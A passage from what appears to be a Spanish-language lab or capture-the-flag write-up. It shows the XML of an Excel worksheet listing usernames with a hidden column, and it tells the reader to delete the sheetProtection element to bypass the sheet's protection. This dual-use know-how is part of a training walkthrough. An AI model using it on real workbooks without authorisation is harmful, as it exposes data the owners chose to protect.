class="nv">si</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>A8&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B8&lt;/f&gt;&lt;v&gt;Hunter.Kirby&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;29&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;30&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C9"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;48&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f&gt;A9&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B9&lt;/f&gt;&lt;v&gt;Sierra.Frye&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;18&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;19&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C10"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;39&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Annabelle.Wells&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"11"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;20&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;21&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;40&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Eve.Galvan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"12"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;22&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;23&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;41&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Jeramiah.Fritz&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"13"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;24&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;25&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;42&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Abby.Gonzalez&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"14"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;26&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;11&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;43&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Joy.Costa&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;27&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;28&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;47&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Vincent.Sutton&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"17"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"3:3"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C17"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"4"</span>/&gt;&lt;/row&gt;&lt;/sheetData&gt;&lt;sheetProtection <span class="nv">algorithmName</span><span class="o">=</span><span class="s2">"SHA-512"</span> <span class="nv">hashValue</span><span class="o">=</span><span class="s2">"hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg=="</span> <span class="nv">saltValue</span><span class="o">=</span><span class="s2">"U9oZfaVCkz5jWdhs9AA8nA=="</span> <span class="nv">spinCount</span><span class="o">=</span><span class="s2">"100000"</span> <span class="nv">sheet</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">objects</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">scenarios</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;pageMargins <span class="nv">left</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">right</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">top</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">bottom</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">header</span><span class="o">=</span><span class="s2">"0.3"</span> <span class="nv">footer</span><span class="o">=</span><span class="s2">"0.3"</span>/&gt;&lt;pageSetup <span class="nv">paperSize</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">orientation</span><span class="o">=</span><span class="s2">"portrait"</span> r:id<span class="o">=</span><span class="s2">"rId1"</span>/&gt;&lt;/worksheet&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a eliminar la etiqueta <code class="language-plaintext highlighter-rouge">sheetProtection</code> para que quede así.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document <span class="nb">cat </span>xl/worksheets/sheet2.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;
&lt;worksheet <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/spreadsheetml/2006/main"</span> xmlns:r<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> xmlns:mc<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> mc:Ignorable<span class="o">=</span><span class="s2">"x14ac xr xr2 xr3"</span> xmlns:x14ac<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac"</span> xmlns:xr<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2014/revision"</span> xmlns:xr2<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2015/revision2"</span> xmlns:xr3<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2016/revision3"</span> xr:uid<span class="o">=</span><span class="s2">"{00000000-0001-0000-0100-000000000000}"</span><span class="o">&gt;</span>&lt;dimension <span class="nv">ref</span><span class="o">=</span><span class="s2">"A1:D17"</span>/&gt;&lt;sheetViews&gt;&lt;sheetView <span class="nv">tabSelected</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">workbookViewId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>&lt;selection <span class="nv">activeCell</span><span class="o">=</span><span class="s2">"F19"</span> <span class="nv">sqref</span><span class="o">=</span><span class="s2">"F19"</span>/&gt;&lt;/sheetView&gt;&lt;/sheetViews&gt;&lt;sheetFormatPr <span class="nv">defaultRowHeight</span><span class="o">=</span><span class="s2">"15"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span>/&gt;&lt;cols&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"10.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"37.5703125"</span> <span class="nv">hidden</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"19.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;/cols&gt;&lt;sheetData&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;0&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;1&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;2&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;31&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;3&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;4&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;44&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D2:D7"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>A2&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B2&lt;/f&gt;&lt;v&gt;Payton.Harmon&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;5&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;6&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;45&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Cortez.Hickman&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;7&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;8&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;46&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Bobby.Wolf&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"5"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;9&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;10&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;35&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Margaret.Robinson&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"6"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;12&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;13&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C6"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;36&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Scarlett.Parks&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"7"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;14&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;15&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;37&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Eliezer.Jordan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"8"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;16&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;17&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;38&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D8:D15"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>A8&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B8&lt;/f&gt;&lt;v&gt;Hunter.Kirby&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;29&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;30&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C9"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;48&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f&gt;A9&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B9&lt;/f&gt;&lt;v&gt;Sierra.Frye&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;18&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;19&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C10"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;39&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Annabelle.Wells&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"11"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;20&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;21&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;40&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Eve.Galvan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"12"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span 